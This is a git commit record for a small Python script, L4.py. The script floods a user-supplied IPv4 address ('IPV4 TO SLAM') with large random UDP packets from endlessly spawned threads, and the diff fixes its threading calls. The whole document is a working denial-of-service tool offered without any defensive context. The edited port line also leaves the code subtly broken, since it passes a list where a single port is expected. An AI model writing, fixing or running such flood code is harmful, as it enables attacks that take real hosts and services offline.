075f459e7b09aa1d1878defacffc6925084b04ae
ACKER POSIDEN <94275268+dev17V@users.noreply.github.com>
2022-02-16 03:58:27 -0800

    Update L4.py

--- L4.py
+++ L4.py
@@ -3,15 +3,15 @@ import threading,socket,random,time,sys,os
 
 def FLOOD():
     ip = input("IPV4 TO SLAM: ")
-    port = 80
+    port = [22, 80, 443, 8080, 1]
     randport=(True,False)[port==0]
     s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
     bytes=random._urandom(15000)
     port=(random.randint(1,15000000),port)[randport]
     s.sendto(bytes,(ip,port))
     while True:
-        t1 = threading.thread(target=FLOOD)
+        t1 = threading.Thread(target=FLOOD)
         t1.start()
-        t2 = threading.thread(target=FLOOD)
-        t1.start()
+        t2 = threading.Thread(target=FLOOD)
+        t2.start()
 FLOOD()
